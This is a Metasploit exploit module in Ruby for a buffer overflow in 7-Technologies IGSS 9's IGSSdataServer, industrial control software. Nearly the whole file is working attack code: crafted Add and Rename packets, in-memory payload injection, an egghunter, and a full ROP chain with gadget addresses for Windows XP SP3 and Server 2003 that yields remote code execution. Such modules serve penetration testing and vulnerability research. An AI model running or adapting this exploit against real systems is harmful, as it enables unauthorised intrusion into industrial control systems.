# $Id: igss9_igssdataserver_rename.rb 12886 2011-06-09 06:04:04Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "7-Technologies IGSS 9 IGSSdataServer .RMS Rename Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found on 7-Technologies IGSS 9. By supplying
                a long string of data to the &#039;Rename&#039; (0x02), &#039;Delete&#039; (0x03), or &#039;Add&#039; (0x04) command,
                a buffer overflow condition occurs in IGSSdataServer.exe while handing an RMS report,
                which results arbitrary code execution under the context of the user.
 
                The attack is carried out in three stages.  The first stage sends the final payload to
                IGSSdataServer.exe, which will remain in memory.  The second stage sends the Add command
                so the process can find a valid ID for the Rename command.  The last stage then triggers
                the vulnerability with the Rename command, and uses an egghunter to search for the
                shellcode that we sent in stage 1.  The use of egghunter appears to be necessary due to
                the small buffer size, which cannot even contain our ROP chain and the final payload.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => "$Revision: 12886 $",
            &#039;Author&#039;         =>
                [
                    &#039;Luigi Auriemma <aluigi[at]autistici.org>&#039;,  #Initial discovery, poc
                    &#039;sinn3r&#039;,                                    #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/igss_5-adv.txt&#039;],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039;        => "\x00",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "seh",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows XP SP3&#039;,
                        {
                            &#039;Ret&#039;          => 0x1B0938B8, #ADD ESP,910; RETN 10 MSJET40.dll
                            &#039;RopOffset&#039;    => 68,         #Offset to the ROP chain
                            &#039;Offset&#039;       => 500,        #Offset to SE Handler (stack pivot)
                            &#039;Max&#039;          => 8000,       #Max buffer size
                        }
                    ],
                    [
                        &#039;Windows Server 2003 SP2/R2 SP2&#039;,
                        {
                            &#039;Ret&#039;       => 0x1B093622, #ADD ESP,910; RETN 10 MSJET40.dll
                            &#039;RopOffset&#039; => 76,         #Offset to the ROP chain
                            &#039;Offset&#039;    => 500,        #Offset to SE Handler (stack pivot)
                            &#039;Max&#039;       => 8000,       #Max buffer size
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Mar 24 2011"))
             
            register_options(
                [
                    Opt::RPORT(12401, false),
                ]
            )
    end
 
    #We need to send the Add command first, so that IGSSdataServer.exe can find the &#039;ID&#039; before
    #triggering the vulnerable code path we&#039;re trying to hit.  Without this, we&#039;ll just hit
    #"FAILED renameDicRec.  ID not found %s" (logText function).
    def add_template(id)
        buf  = &#039;&#039;
        buf << "\x9b\x00"  #Packet size
        buf << "\x01\x00\x34\x12"
        buf << "\x07"      #Opcode
        buf << "\x00\x00\x00\x00\x00\x00\x00"
        buf << "\x01"      #Flag
        buf << "\x00\x00\x00"
        buf << "\x04"      #Command (add)
        buf << "\x00\x00\x00"
        buf << id
        buf << "\x00"
        buf << "\x00"*31
        buf << "\x78"
        buf << "\x00"*63
        buf << "\x78"
        buf << "\x00"*28
 
        connect
 
        sock.put(buf)
 
        print_status("Sending ADD command to #{datastore[&#039;RHOST&#039;]}")
        res = sock.recv(1024)
 
        disconnect
 
        return res
    end
 
    #Since we don&#039;t have a lot of space on the stack when we trigger the overflow, we send a
    #separate packet that contains our final payload, and let egghunter look for it later in memory
    def inject_payload(my_payload)
 
        buf  = &#039;&#039;
        buf << "\x01\x00\x34\x12"
        buf << "\x0D"  #Opcode
        buf << "\x00\x00\x00\x00\x00\x00\x00"
        buf << "\x01"  #Flag
        buf << "\x00\x00\x00"
        buf << "\x01"  #Command (ListAll)
        buf << "\x00\x00\x00"
        buf << my_payload
        buf << Rex::Text.rand_text_alpha(1024-my_payload.length)
        buf << "\x00"*130
 
        #Packet size
        buf_size = [buf.length + 2].pack(&#039;v&#039;)
        buf = buf_size + buf
 
        connect
 
        sock.put(buf)
        print_status("Injecting payload in memory to #{datastore[&#039;RHOST&#039;]}")
 
        disconnect
    end
 
    #It&#039;s definitely junk
    def junk
        return rand_text(4).unpack("L")[0].to_i
    end
 
    def sploit_rename(id)
        #Egghunter is used because we don&#039;t really have a lot of space on the stack
        #to fit the ROP chain and a larger payload
        eggoptions =
        {
            :checksum  => true,
            :eggtag    => &#039;W00T&#039;,
            :depmethod => &#039;virtualprotect&#039;,
        }
 
        hunter, p = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
 
        esi  = "\x81\xf6\x16\x1b\x5f\x5e"  #XOR ESI, 0x5E5F1B16
        esi << "\x3e\x8b\x36"              #MOV ESI, DWORD PTR DS:[ESI]
 
        hunter = esi + hunter
 
        #Send final payload first, and let egghunter look for it
        inject_payload(p)
 
        #Max ROP chain size we can use is 406 bytes
        rop  = [
            :xchg_esp_ebp,
            #0x59ABA24B,  #PUSH ESP # POP EBP # RETN  [dbghelp.dll]
            junk,
            junk,
            junk,
            junk,
            0x1B76A59E,  #XCHG EAX,EBP # RETN  [dao360.dll]
            0x1B8260DD,  #ADD EAX,20 # RETN  [msjtes40.dll]
            :add_eax_100,
            #0x1B09FA13,  #ADD EAX,100 # RETN 0C  [MSJET40.DLL]
 
            #VirtualProtect Argument ([0x540214])
            :xchg_eax_ecx,
            junk,
            junk,
            junk,
            :pop_eax,
            0x3BABFD6D,  #0x3BABFD6D xor 0x3BFFFF79
            0x1B7802A3,  #XOR EAX,3BFFFF79 # RETN  [dao360.dll]
            0x1b73f3bd,  #MOV EAX,DWORD PTR DS:[EAX] # RETN  [dao360.dll]
            :xchg_eax_ecx,
            0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]
            0x1B74C50A,  #ADD EAX,4 # RETN  [dao360.dll]
 
            #Retn:
            :xchg_eax_esi,
            #0x1B0505C1,  #PUSH EAX # POP ESI # RETN 4  [MSJET40.DLL]
            0x1B8260DD,  #ADD EAX,20 # RETN  [Module : msjtes40.dll]
            junk,
            0x1B8260DD,  #ADD EAX,20 # RETN  [msjtes40.dll]
            0x1B8260DD,  #ADD EAX,20 # RETN  [msjtes40.dll]
            0x1B8260DD,  #ADD EAX,20 # RETN  [msjtes40.dll]
            :xchg_eax_ecx,
            :mov_eax_esi_pop_esi,
            #0x1B03AD44,  #MOV EAX,ESI # POP ESI # RETN  [MSJET40.DLL]
            0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]
            0x1B74C50A,  #ADD EAX,4 # RETN  [dao360.dll]
 
            #Shellcode:
            0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]
            0x1B74C50A,  #ADD EAX,4 # RETN  [dao360.dll]
 
            #Size (100 bytes -- enough for egghunter)
            :xchg_eax_ecx,
            :pop_eax,
            :size_xor,
            0x1B7802A3,  #XOR EAX,3BFFFF79 # RETN  [dao360.dll]
            :xchg_eax_ecx,
            0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]
            0x1B74C50A,  #ADD EAX,4 # RETN  [dao360.dll]
 
            #newProtect (0x40):
            :xchg_eax_ecx,
            :pop_eax,
            0x3BFFFF39,  #0x3BFFFF39 xor 0x3BFFFF79
            0x1B7802A3,  #XOR EAX,3BFFFF79 # RETN  [dao360.dll]
            :xchg_eax_ecx,
            0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]
            0x1B74C50A,  #ADD EAX,4 # RETN  [dao360.dll]
 
            #oldProtect
            0x1B731395,  #POP ECX # RETN  [dao360.dll]
            0x1B82B410,  #.data section (WR) in msjtes40.dll
            0x1B829E75,  #MOV DWORD PTR DS:[EAX],ECX # RETN  [msjtes40.dll]
 
            #Align the rewind part
            0x1B829E86,  # ADD EAX,0C # RETN  [msjtes40.dll]
 
            #Rewind
            :rewind,
 
            #Execute
            0x1B72A833,  #XCHG EAX,ESP # RETN  [dao360.dll]
        ]
 
        #OS specific gadgets
        rop.map! do |gadget|
            if gadget == :xchg_esp_ebp
                (target.name =~ /xp/i) ? 0x59ABA24B : 0x6D5E2223
            elsif gadget == :add_eax_100
                (target.name =~ /xp/i) ? 0x1B09FA13 : 0x1B09F6F3
            elsif gadget == :xchg_eax_esi
                (target.name =~ /xp/i) ? 0x1B0505C1 : 0x1B051B71
            elsif gadget == :xchg_eax_ecx
                (target.name =~ /xp/i) ? 0x1B02708C : 0x1B02B28D
            elsif gadget == :mov_eax_esi_pop_esi
                (target.name =~ /xp/i) ? 0x1B03AD44 : 0x1B110735
            elsif gadget == :pop_eax
                (target.name =~ /xp/i) ? 0x1B0C65B6 : 0x1B0c6169
            elsif gadget == :size_xor
                (target.name =~ /xp/i) ? 0x3BFFFF01 : 0x3BFFFF1D
            elsif gadget == :rewind
                (target.name =~ /xp/i) ? 0x1B03D70A : 0x1B03C741
            else
                gadget
            end
        end
 
        rop = rop.pack(&#039;V*&#039;)
 
        sploit  = &#039;&#039;
        sploit << Rex::Text.rand_text_alpha(target[&#039;RopOffset&#039;])
        sploit << rop
        sploit << Rex::Text.rand_text_alpha(target[&#039;Offset&#039;]-sploit.length)
        sploit << [target.ret].pack(&#039;V&#039;)  #Pivot
        sploit << make_nops(12)  #Padding
        sploit << hunter
        sploit << Rex::Text.rand_text_alpha(target[&#039;Max&#039;]-sploit.length)
 
        #Create the packet with our naughty payload
        pkt  = "\x00\x04"  #Funky size causes overflow
        pkt << "\x01\x00\x34\x12"
        pkt << "\x07"      #Opcode
        pkt << "\x00\x00\x00\x00\x00\x00\x00"
        pkt << "\x02"      #Flag
        pkt << "\x00\x00\x00"
        pkt << "\x02"      #Command
        pkt << "\x00\x00\x00"
        pkt << id
        pkt << "\x00"
        pkt << sploit
 
        connect
 
        print_status("Sending malicious request to #{datastore[&#039;RHOST&#039;]}")
        sock.put(pkt)
 
        handler
 
        #egghunter takes a few seconds, wait a bit before disconnect
        select(nil, nil, nil, 3)
        disconnect
    end
 
    def exploit
        id = Rex::Text.rand_text_alpha(8)
 
        res = add_template(id)
        if res !~ /Report/i
            print_error("Failed to add template:#{res}")
            return
        end
 
        sploit_rename(id)
    end
end



